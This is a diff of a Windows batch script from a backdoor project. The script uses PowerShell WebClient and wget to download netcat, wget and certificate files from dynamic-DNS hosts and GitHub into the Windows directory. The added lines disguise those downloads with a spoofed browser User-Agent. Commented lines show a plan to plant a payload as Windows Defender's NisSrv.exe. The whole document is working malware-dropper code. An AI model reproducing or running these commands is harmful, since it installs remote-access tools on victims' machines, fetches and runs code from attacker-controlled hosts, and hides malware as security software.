@@ -35,6 +35,8 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
 set url=http://config02.addns.org
 set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
+rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
+%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')"
 if "%PROCESSOR_ARCHITECTURE%"=="x86" goto 32BIT
 echo 64-bit OS
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
@@ -43,12 +45,13 @@ wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
 goto END
 :32BIT
 echo 32-bit OS
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')
+rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')
+%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')"
 wget --no-check-certificate %urlgit%/nc.exe  -O %windir%\nc64.exe
 :END
 
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
+
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
